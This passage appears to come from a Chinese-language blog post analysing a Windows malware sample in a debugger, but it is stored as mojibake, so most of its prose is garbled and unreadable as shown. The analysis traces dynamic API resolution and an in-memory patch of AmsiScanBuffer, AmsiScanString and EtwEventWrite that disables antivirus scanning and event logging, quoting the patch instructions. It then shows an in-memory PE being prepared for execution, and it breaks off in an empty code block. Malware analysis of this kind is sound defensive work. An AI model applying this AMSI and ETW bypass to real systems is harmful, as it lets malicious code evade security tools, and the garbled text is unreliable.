ä¸ºæˆ‘ä»¬ä¹‹å‰å·²ç»åŠ è½½å¹¶è·å–äº†LoadLibraryAçš„å‡½æ•°æŒ‡é’ˆã€‚æˆ‘ä»¬å°†è¿™ä¸ªå‡½æ•°æ ‡è®°ä¸ºget_dll_base_addr</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819234428833.png" alt="image-20250819234428833"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250819234631589.png" alt="image-20250819234631589"></p><p>æ­¤æ—¶å¾ˆæ¸…æ¥šï¼Œå¾ªç¯çš„ç»“æ„æ˜¯è¿™æ ·çš„ï¼š</p><p>1.å°†æŒ‡é’ˆæ²¿åŒ…å«ç”±â€œï¼›â€åˆ†éš”çš„DLLåç§°çš„å­—ç¬¦ä¸²å‰è¿›ï¼›</p><p>2.å½“é‡åˆ°â€œï¼›â€æ—¶ï¼Œé€€å‡ºå†…éƒ¨å¾ªç¯ï¼›</p><p>3.åŠ è½½DLLã€‚</p><p>ä¸‹ä¸€ä¸ª</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820102926633.png" alt="image-20250820102926633"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820103018654.png" alt="image-20250820103018654"></p><p>è¿”å›kernel32.GetProcAddressï¼Œè¿™æ˜¯å¦ä¸€ä¸ªé‡è¦çš„APIå‡½æ•°ï¼Œæ¶æ„è½¯ä»¶é€šå¸¸ä½¿ç”¨å®ƒæ¥åŠ è½½APIå‡½æ•°ï¼Œæˆ‘ä»¬è¿˜æ³¨æ„åˆ°ï¼Œæˆ‘ä»¬åˆè¿›å…¥äº†ä¸€ä¸ªå¾ªç¯<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820103143719.png" alt="image-20250820103143719"></p><p>ä½¿ç”¨ç›¸åŒçš„å¾ªç¯å‡ æ¬¡å¹¶è§‚å¯Ÿå¯„å­˜å™¨çš„ç­–ç•¥ï¼Œæˆ‘ä»¬è§‚å¯Ÿåˆ°åœ¨æ¯æ¬¡è¿­ä»£ä¸­ï¼ŒECXå¢åŠ 4ï¼ŒEBPå¢åŠ 1ï¼Œå¹¶ä¸”åœ¨EAXä¸­è¿”å›ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆã€‚<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820103332176.png" alt="image-20250820103332176"></p><p>åœ¨å†…å­˜è½¬å‚¨ä¸­ï¼Œå¦‚æœæˆ‘ä»¬åœ¨æ¯æ¬¡è¿­ä»£æœŸé—´ç›‘è§†ECXæ‰€æŒ‡å‘çš„åœ°å€ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç›´è§‚çš„çœ‹å†…å­˜æ­£è¢«å‡½æ•°æŒ‡é’ˆå¡«æ»¡</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820103744316.png" alt="image-20250820103744316"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820153251544.png" alt="image-20250820153251544"></p><p>æ˜¾ç„¶ï¼Œæ¶æ„è½¯ä»¶æ­£æ˜¯åœ¨è¿™é‡Œä¿å­˜äº†å·²åŠ è½½APIçš„å‡½æ•°æŒ‡é’ˆã€‚å…¶æ ¸å¿ƒæ“ä½œæ˜¯å°†å‡½æ•°æŒ‡é’ˆå­˜å…¥å†…å­˜ï¼Œä»è€Œå®ç°åŠ¨æ€APIè§£æè¿™ä¸€å¸¸ç”¨æŠ€æœ¯ã€‚è¿™æ ·å¯ä»¥é¿å…å¯¼å…¥è¡¨ä¸­ä½¿ç”¨äº†è¿™äº›dllï¼Œæœ‰ä¸€å®šçš„å…æ€æ•ˆæœã€‚</p><h3 id="éƒ¨åˆ†æ€»ç»“1-åŠ¨æ€åŠ è½½dllä¸å‡½æ•°"><a href="#éƒ¨åˆ†æ€»ç»“1-åŠ¨æ€åŠ è½½dllä¸å‡½æ•°" class="headerlink" title="éƒ¨åˆ†æ€»ç»“1 åŠ¨æ€åŠ è½½dllä¸å‡½æ•°"></a>éƒ¨åˆ†æ€»ç»“1 åŠ¨æ€åŠ è½½dllä¸å‡½æ•°</h3><p>ç ”ç©¶å‘ç°ï¼Œè¯¥æ¶æ„è½¯ä»¶å…·æœ‰ä»¥ä¸‹ç‰¹å¾ï¼š1.åŠ¨æ€åŠ è½½VirtualAllocå¹¶åˆ†é…å¤§é‡å†…å­˜ç©ºé—´ï¼›2.å°†å¤§é‡æ•°æ®ä»å†…å­˜å¤åˆ¶åˆ°æ–°åˆ†é…çš„å†…å­˜åŒºåŸŸè¿›è¡Œè§£å¯†ï¼Œå…¶ä¸­åŒ…å«å¸¸ç”¨ç³»ç»ŸDLLçš„åç§°åˆ—è¡¨ï¼›3.å°†è¿™äº›DLLåŠ è½½è‡³å†…å­˜åï¼ŒæŸ¥æ‰¾æŒ‡å®šAPIå‡½æ•°æŒ‡é’ˆï¼Œå¹¶å°†å®ƒä»¬ä¿å­˜åˆ°å…ˆå‰åˆ†é…çš„å†…å­˜ä¸­ã€‚</p><h3 id="æ›´æ”¹AMSIå‡½æ•°çš„å†…å­˜ä¿æŠ¤"><a href="#æ›´æ”¹AMSIå‡½æ•°çš„å†…å­˜ä¿æŠ¤" class="headerlink" title="æ›´æ”¹AMSIå‡½æ•°çš„å†…å­˜ä¿æŠ¤"></a>æ›´æ”¹AMSIå‡½æ•°çš„å†…å­˜ä¿æŠ¤</h3><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820104936145.png" alt="image-20250820104936145"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820152959700.png" alt="image-20250820152959700"></p><p>è¿è¡Œçš„æ—¶å€™ç¨‹åºæ˜¯æ²¡æœ‰åˆ°è¿™ä¸ªå‡½æ•°çš„ï¼Œå…ˆæ”¾ç€ã€‚å¦‚ä¸‹å›¾æ˜¯è¿›å…¥äº†ä¸‹ä¸€ä¸ªifçš„åœ°æ–¹</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820153348534.png" alt="image-20250820153348534"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820153414255.png" alt="image-20250820153414255"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820153439202.png" alt="image-20250820153439202"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820153749767.png" alt="image-20250820153749767"></p><p>æ‰§è¡Œå…¶ä¸­çš„ç¬¬ä¸€ä¸ªå‡½æ•°get_dll_base_addrï¼Œå‘ç°è·å–çš„æ˜¯asmi.dllçš„åŸºå€ã€‚<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820154533517.png" alt="image-20250820154533517"></p><p>æˆ‘ä»¬ç»§ç»­å‘å‰æ¨è¿›ï¼Œç›´åˆ°é‡åˆ°ä¸‹ä¸€ä¸ªå‡½æ•°sub_10A3C2ï¼ŒæŸ¥çœ‹å‚æ•°ä¸è¿”å›å€¼ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820154825115.png" alt="image-20250820154825115"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820154848548.png" alt="image-20250820154848548"></p><p>è¯¥å‡½æ•°ä¼¼ä¹å°†æŒ‡å‘allocatedMEMçš„æŒ‡é’ˆã€amsi.dllçš„åŸºåœ°å€å’Œå­—ç¬¦ä¸²â€œAmsiScanBufferâ€ä½œä¸ºå‚æ•°ï¼Œå¹¶è¿”å›æŒ‡å‘AmsiScanBufferçš„æŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆç”¨äºæ‰«æç¼“å†²åŒºä¸­çš„æ¶æ„è½¯ä»¶ã€‚è®©æˆ‘ä»¬ç›¸åº”åœ°æ›´æ–°å˜é‡å’Œå‡½æ•°ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820160553802.png" alt="image-20250820160553802"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820160644226.png" alt="image-20250820160644226"></p><p>å››ä¸ªå‚æ•°</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820160700839.png" alt="image-20250820160700839"></p><p>æˆ‘ä»¬åœ¨AmsiScanBufferæŒ‡ä»¤çš„èµ·å§‹ä½ç½®è®¾ç½®äº†12å­—èŠ‚ï¼ˆ0xCï¼‰çš„å†…å­˜ç©ºé—´ï¼Œå°†å…¶é…ç½®ä¸ºPAGEExecute_Read_Writeæ¨¡å¼ï¼ˆ0x40ï¼‰ï¼Œå¹¶å°†åŸæœ‰ä¿æŠ¤å€¼å­˜å…¥åœ°å€ã€‚è¿™ç§å°†å†…å­˜ç©ºé—´åŒæ—¶è®¾ç½®ä¸ºå¯å†™å’Œå¯æ‰§è¡Œçš„æ“ä½œï¼Œä¸ºæ¶æ„æ”»å‡»è€…æä¾›äº†æ‰§è¡Œä»»æ„ä»£ç çš„æ¼æ´ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå­˜å‚¨åŠŸèƒ½æŒ‡ä»¤çš„å†…å­˜åŒºåŸŸï¼ˆç‰¹åˆ«æ˜¯ä½œä¸ºWindowså®‰å…¨æ ¸å¿ƒç»„ä»¶çš„åŠŸèƒ½æ¨¡å—ï¼‰è¢«åŒæ—¶è®¾ç½®ä¸ºå¯æ‰§è¡Œå’Œå¯å†™æ¨¡å¼ï¼Œè¿™ä¸€æ“ä½œå­˜åœ¨é‡å¤§å®‰å…¨éšæ‚£ã€‚</p><h4 id="ç¨‹åºè®¡æ•°å™¨ï¼ˆPCï¼‰-ç›¸å¯¹å¯»å€"><a href="#ç¨‹åºè®¡æ•°å™¨ï¼ˆPCï¼‰-ç›¸å¯¹å¯»å€" class="headerlink" title="ç¨‹åºè®¡æ•°å™¨ï¼ˆPCï¼‰-ç›¸å¯¹å¯»å€"></a>ç¨‹åºè®¡æ•°å™¨ï¼ˆPCï¼‰-ç›¸å¯¹å¯»å€</h4><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820161153777.png" alt="image-20250820161153777"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820161301772.png" alt="image-20250820161301772"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820161315994.png" alt="image-20250820161315994"></p><p>å®ƒä¸éœ€è¦ä»»ä½•å‚æ•°ï¼Œå½“æˆ‘ä»¬è·¨è¿‡å®ƒæ—¶ï¼Œå®ƒåªä¼šè¿”å›å‡½æ•°çš„åœ°å€<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820161858998.png" alt="image-20250820161858998"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820162732545.png" alt="image-20250820162732545"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820165518395.png" alt="image-20250820165518395"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820165621551.png" alt="image-20250820165621551"></p><h4 id="Disabling-AmsiScanBuffer"><a href="#Disabling-AmsiScanBuffer" class="headerlink" title="Disabling AmsiScanBuffer"></a>Disabling AmsiScanBuffer</h4><p>æ¥ä¸‹æ¥æ˜¯ä¸‹ä¸€ä¸ªå‡½æ•°ï¼Œmemcpy<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820165716511.png" alt="image-20250820165716511"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820165737883.png" alt="image-20250820165737883"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820165932465.png" alt="image-20250820165932465"></p><p>12å­—èŠ‚å°†è¢«å¤åˆ¶åˆ°amsi.AmsiScanBufferï¼Œä¸‹å›¾æ˜¯ä¿®æ”¹å‰çš„amsiçš„å‡½æ•°ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820170034505.png" alt="image-20250820170034505"></p><p>å¤åˆ¶ä¹‹åçš„</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820170108489.png" alt="image-20250820170108489"></p><p>è¿™éƒ¨åˆ†å†…å®¹è§£ç­”äº†æˆ‘ä»¬ä¹‹å‰çš„ç–‘é—®ï¼šæ¶æ„è½¯ä»¶é€šè¿‡å°†å†…å­˜ä¿æŠ¤å±æ€§ä¿®æ”¹ä¸º <strong><code>PAGE_EXECUTE_READWRITE</code></strong>ï¼ˆå¯æ‰§è¡Œã€å¯è¯»ã€å¯å†™ï¼‰ï¼Œä»è€Œèƒ½å¤Ÿç›´æ¥è¦†å†™ <code>AmsiScanBuffer</code>å‡½æ•°çš„ <strong>å‰12å­—èŠ‚</strong>ã€‚</p><p>ä½†æˆ‘ä»¬çš„ç–‘é—®ä»æœªå®Œå…¨è§£å¼€â€”â€”<strong>æ¶æ„è½¯ä»¶ä¸ºä½•è¦è¿™æ ·åšï¼Ÿ</strong></p><p>ç”±äºè¿™äº›å­—èŠ‚æ˜¯æœºå™¨æŒ‡ä»¤ï¼ˆinstructionsï¼‰ï¼Œé€šè¿‡å¯¹æ¯” <code>memcpy</code>è°ƒç”¨å‰å <code>AmsiScanBuffer</code>çš„åæ±‡ç¼–æŒ‡ä»¤å˜åŒ–ï¼Œæˆ–è®¸èƒ½æ­ç¤ºå…¶çœŸå®æ„å›¾ã€‚</p><p>å°†æ‰§è¡ŒçŠ¶æ€å›é€€åˆ° <code>memcpy</code>è°ƒç”¨å‰çš„æ—¶åˆ»ï¼Œå¹¶æ£€æŸ¥æ­¤æ—¶ <code>AmsiScanBuffer</code>çš„åæ±‡ç¼–æŒ‡ä»¤ã€‚</p><p>ä¿®æ”¹å‰ï¼š</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820170332488.png" alt="image-20250820170332488"></p><p>ä¿®æ”¹åï¼š</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820170425836.png" alt="image-20250820170425836"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820170600235.png" alt="image-20250820170600235"></p><p>ç¬¬ä¸€æ¡æŒ‡ä»¤ <code>mov eax, [esp+18]</code>å°† <code>esp+18</code>å¤„çš„å†…å®¹ï¼ˆå³ <code>AmsiScanBuffer</code>çš„ç¬¬å…­ä¸ªå‚æ•°ï¼‰åŠ è½½åˆ° <code>EAX</code>å¯„å­˜å™¨ã€‚æ ¹æ® <code>AmsiScanBuffer</code>çš„å®˜æ–¹æ–‡æ¡£ï¼Œæœ€åä¸€ä¸ªå‚æ•° <code>AMSI_RESULT</code>æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘ç¼“å†²åŒºæ‰«æçš„ç»“æœã€‚</p><p>æ¥ä¸‹æ¥çš„æŒ‡ä»¤ <code>and [eax], 0</code>å°† <code>AMSI_RESULT</code>çš„å€¼è®¾ä¸º <code>0</code>ï¼Œæ ¹æ® <code>amsi.h</code>çš„å®šä¹‰ï¼Œè¿™å¯¹åº” <strong><code>AMSI_RESULT_CLEAN</code></strong>ï¼Œè¡¨ç¤ºç¼“å†²åŒºä¸­æœªæ£€æµ‹åˆ°æ¶æ„å†…å®¹ã€‚</p><p>æ€»ä¹‹ï¼ŒAmsiScanBufferå·²åœ¨å†…å­˜ä¸­æ‰“è¡¥ä¸ï¼Œä»¥å§‹ç»ˆè¿”å›AMSI_RESULT_CLEANã€‚è¿™æ˜¯ç”¨äºç»•è¿‡AMSIçš„è®¸å¤šæ–¹æ³•ä¹‹ä¸€ã€‚</p><h4 id="æ¢å¤AmsiScanBufferçš„å†…å­˜ä¿æŠ¤"><a href="#æ¢å¤AmsiScanBufferçš„å†…å­˜ä¿æŠ¤" class="headerlink" title="æ¢å¤AmsiScanBufferçš„å†…å­˜ä¿æŠ¤"></a>æ¢å¤AmsiScanBufferçš„å†…å­˜ä¿æŠ¤</h4><p>æˆ‘ä»¬ç»§ç»­æ‰§è¡Œä¸‹ä¸€ä¸ªå‡½æ•°è°ƒç”¨ï¼Œè¯¥è°ƒç”¨åŒæ ·ä½¿ç”¨æŒ‡é’ˆè¿ç®—</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820171054902.png" alt="image-20250820171054902"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820171113397.png" alt="image-20250820171113397"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820171124000.png" alt="image-20250820171124000"></p><p>ä¸ç¬¬ä¸€æ¬¡è°ƒç”¨VirtualProtectç±»ä¼¼ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æŒ‡å‘AmsiScanBufferçš„æŒ‡é’ˆï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯12ï¼Œä½†ç¬¬ä¸‰ä¸ªå‚æ•°è¿™æ¬¡æ˜¯0x20ã€‚å¦‚æœæˆ‘ä»¬æŸ¥é˜…Microsoftå…³äºVirtualProtectçš„æ–‡æ¡£ï¼Œå°±ä¼šå‘ç°è¯¥å€¼å¯¹åº”PAGE_EXECUTE_READã€‚è¿™è¡¨æ˜æ¶æ„è½¯ä»¶ä¼¼ä¹æ­£åœ¨å°†å†…å­˜ä¿æŠ¤æ¢å¤åˆ°å…¶åŸå§‹å€¼</p><h4 id="Disabling-AmisScanString"><a href="#Disabling-AmisScanString" class="headerlink" title="Disabling AmisScanString"></a>Disabling AmisScanString</h4><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820171331769.png" alt="image-20250820171331769"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820171623581.png" alt="image-20250820171623581"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820171649499.png" alt="image-20250820171649499"></p><p>è¿™éƒ¨åˆ†è¿è¡Œåˆ°æœ€åï¼Œè·Ÿåˆšåˆšçš„å‡½æ•°ä¿®æ”¹çš„ä¸€æ ·ï¼Œéƒ½æ˜¯é¦–å…ˆä¿®æ”¹å†…å­˜ä¿æŠ¤ï¼Œç„¶åä¿®æ”¹å†…å®¹ï¼Œç„¶åå†æŠŠä¿æŠ¤ä¿®æ”¹å›å»ã€‚<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820171931415.png" alt="image-20250820171931415"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820172036476.png" alt="image-20250820172036476"></p><h3 id="ç¦ç”¨EtwEventWrite"><a href="#ç¦ç”¨EtwEventWrite" class="headerlink" title="ç¦ç”¨EtwEventWrite"></a>ç¦ç”¨EtwEventWrite</h3><p>è®©æˆ‘ä»¬é€€å‡ºsub_108106å¹¶å°†å…¶æ ‡è®°ä¸ºdisable_amsiï¼Œç„¶åè¿›å…¥ä¸‹ä¸€ä¸ªå‡½æ•°sub_108201</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820172217249.png" alt="image-20250820172217249"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820172408303.png" alt="image-20250820172408303"></p><p>å¦‚æœæˆ‘ä»¬æŸ¥çœ‹sub_108201çš„åç¼–è¯‘ä»£ç ï¼Œä¼šå‘ç°å®ƒä¸disable_amsiéå¸¸ç›¸ä¼¼ï¼Œéƒ½è°ƒç”¨äº†get_dll_base_addrã€get_dll_funcå’Œmemcpyå‡½æ•°ã€‚å› æ­¤ï¼Œæˆ‘ä»¬çš„ç›´è§‰å‘Šè¯‰æˆ‘ä»¬ï¼Œè¿™ä¸ªå‡½æ•°å¯èƒ½ä¸disable_amsiç±»ä¼¼ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820172520011.png" alt="image-20250820172520011"></p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†è·³è½¬åˆ°get_dll_funcå‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šè¿”å›æŒ‡å‘ntdllçš„æŒ‡é’ˆã€‚EtwEventWriteï¼ˆå›¾3.7.4)ã€‚EtwEventWriteç”¨äºè®°å½•äº‹ä»¶ï¼ˆä¾‹å¦‚ç½‘ç»œè¿æ¥ã€ç£ç›˜I&#x2F;Oã€è¿›ç¨‹åˆ›å»ºï¼‰ï¼Œè¿™äº›äº‹ä»¶å¯ä»¥è¢«EDRså’Œé˜²ç—…æ¯’å·¥å…·ç­‰å®‰å…¨ç³»ç»Ÿæ•è·ï¼Œä»¥æ£€æµ‹å¨èƒã€‚<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820172738345.png" alt="image-20250820172738345"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820172752986.png" alt="image-20250820172752986"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820172820348.png" alt="image-20250820172820348"></p><p>æ›´æ”¹è¿™ä¸ªå‡½æ•°å†…å­˜ä¿æŠ¤</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820172843530.png" alt="image-20250820172843530"></p><p>å¤åˆ¶å†…å®¹åˆ°å‡½æ•°å¼€å§‹</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820172956857.png" alt="image-20250820172956857"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820173044690.png" alt="image-20250820173044690"></p><p>æˆ‘ä»¬å°†é€€å‡ºsub_108201å¹¶å°†å…¶é‡å‘½åä¸ºdisable_etw_event_write</p><h3 id="éƒ¨åˆ†æ€»ç»“2-ç¦ç”¨å®‰å…¨åŠŸèƒ½asmiå’Œetw"><a href="#éƒ¨åˆ†æ€»ç»“2-ç¦ç”¨å®‰å…¨åŠŸèƒ½asmiå’Œetw" class="headerlink" title="éƒ¨åˆ†æ€»ç»“2 ç¦ç”¨å®‰å…¨åŠŸèƒ½asmiå’Œetw"></a>éƒ¨åˆ†æ€»ç»“2 ç¦ç”¨å®‰å…¨åŠŸèƒ½asmiå’Œetw</h3><p>æ€»è€Œè¨€ä¹‹ï¼Œæ¶æ„è½¯ä»¶é€šè¿‡ä»¥ä¸‹æ“ä½œç¦ç”¨äº†å‡ ä¸ªå¯¹å®‰å…¨è‡³å…³é‡è¦çš„é‡è¦Windows APIå‡½æ•°ï¼š</p><ol><li>è·å–amsi.dllå’Œntdll.dllçš„åŸºåœ°å€</li><li>è·å–AmsiScanBufferã€AmsiScanStringå’ŒEtwEventWriteçš„å‡½æ•°æŒ‡é’ˆ</li><li>è°ƒç”¨VirtualProtectå°†å†…å­˜ä¿æŠ¤è®¾ç½®ä¸ºRWX</li><li>é‡å†™æŒ‡ä»¤ä¸­çš„ä¸€äº›å­—èŠ‚ä»¥ä½¿è¿™äº›å‡½æ•°æ— ç”¨</li><li>è°ƒç”¨VirtualProtectå°†å†…å­˜ä¿æŠ¤è®¾ç½®ä¸ºR-X</li></ol><p>è¿™ç§å†…å­˜ä¿®è¡¥æ–¹æ³•é€šå¸¸è¢«æ¶æ„è¡Œä¸ºè€…æˆ–çº¢é˜Ÿç”¨æ¥ç»•è¿‡ETWå’ŒAMSIç­‰ç»„ä»¶ã€‚<br>æˆ‘ä»¬è¿˜è§‚å¯Ÿåˆ°æ¶æ„è½¯ä»¶ä½¿ç”¨ç›¸å¯¹äºPCçš„å¯»å€æ¥å®šä½èµ„æºï¼Œä¾‹å¦‚ç”¨äºé‡å†™AmsiScanBufferã€AmsiScanStringå’ŒEtwEventWriteçš„ä¼ªä»£ç ã€‚</p><h3 id="å°†PEæ–‡ä»¶å¤åˆ¶åˆ°å†…å­˜"><a href="#å°†PEæ–‡ä»¶å¤åˆ¶åˆ°å†…å­˜" class="headerlink" title="å°†PEæ–‡ä»¶å¤åˆ¶åˆ°å†…å­˜"></a>å°†PEæ–‡ä»¶å¤åˆ¶åˆ°å†…å­˜</h3><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820213330294.png" alt="image-20250820213330294"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820213357102.png" alt="image-20250820213357102"></p><p>å†…å­˜å¤åˆ¶ä¹‹åï¼ŒæŸ¥çœ‹åˆ†é…çš„å†…å­˜æƒ…å†µã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820214434079.png" alt="image-20250820214434079"></p><p>è¿™äº›å­—èŠ‚çš„ç›®çš„å¹¶ä¸æ˜æ˜¾ï¼Œå› æ­¤æˆ‘ä»¬å°†å‘å‰æ¨è¿›ï¼Œç›´åˆ°ä¸‹ä¸€æ¬¡å‡½æ•°è°ƒç”¨ä¸ºæ­¢sub_10A795</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820214844629.png" alt="image-20250820214844629"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820215031375.png" alt="image-20250820215031375"></p><p>é—®ä¸€ä¸‹AI</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820215349798.png" alt="image-20250820215349798"></p><p>æ‰§è¡Œä¹‹åï¼Œå‘ç°ä¸‹é¢æ˜¯MZå¼€å¤´ï¼Œæ˜¯PEæ–‡ä»¶æ ¼å¼çš„ç‰¹å¾ã€‚<img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820215510727.png" alt="image-20250820215510727"></p><p>å¯¹äºç»éªŒä¸°å¯Œçš„ç ”ç©¶äººå‘˜æˆ–ç»å¸¸å¤„ç†PEæ–‡ä»¶çš„äººæ¥è¯´ï¼Œå­—èŠ‚â€˜4D 5Aâ€™æˆ–å­—ç¬¦ä¸²â€˜MZâ€™å¯èƒ½æ˜¾å¾—çœ¼ç†Ÿâ€”â€”è¿™äº›æ­£æ˜¯PEæ–‡ä»¶çš„é­”æ³•å­—èŠ‚ã€‚å½“å†…å­˜è¢«åˆ†é…å¹¶å¡«æ»¡PEæ–‡ä»¶çš„å­—èŠ‚æ—¶ï¼Œè¿™ç§æƒ…å†µéå¸¸å¯ç–‘ï¼Œå› ä¸ºè¿™äº›æ•°æ®å¾ˆå¯èƒ½ä»¥æŸç§æ–¹å¼è¢«æ‰§è¡Œã€‚æˆ‘ä»¬éœ€è¦è®°å½•ä¸‹è¿™ä¸ªå†…å­˜åœ°å€ï¼Œä»¥ä¾¿åç»­æŸ¥çœ‹å…¶ä½¿ç”¨æƒ…å†µï¼š</p><h3 id="CLR"><a href="#CLR" class="headerlink" title="CLR"></a>CLR</h3><p>ç»§ç»­å‘ä¸‹åˆ†æï¼Œç»è¿‡äº†ä¸€ä¸ªswitchä¹‹åï¼Œè¿è¡Œåˆ°äº†sub_108D67</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820221356385.png" alt="image-20250820221356385"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820221427519.png" alt="image-20250820221427519"></p><p>çœ‹ä¸€ä¸‹å‚æ•°</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820221648783.png" alt="image-20250820221648783"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250820223911325.png" alt="image-20250820223911325"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821001443043.png" alt="image-20250821001443043"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250821001503202.png" alt="image-20250821001503202"></p><p>æ­¥éª¤ 2ï¼šC++ ä»£ç è°ƒç”¨ .NET DLL</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span 